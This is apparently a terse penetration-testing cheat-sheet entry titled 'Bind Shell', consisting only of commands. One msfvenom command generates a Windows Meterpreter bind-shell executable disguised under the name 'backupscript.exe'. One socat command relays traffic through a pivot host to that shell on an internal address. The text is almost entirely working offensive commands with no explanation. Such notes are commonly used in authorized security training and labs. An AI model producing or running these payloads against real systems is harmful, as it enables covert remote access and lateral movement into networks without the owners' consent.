## Bind Shell
Windows Payload 
```shell-session
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
```

Socat Bind Shell 
```shell-session
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
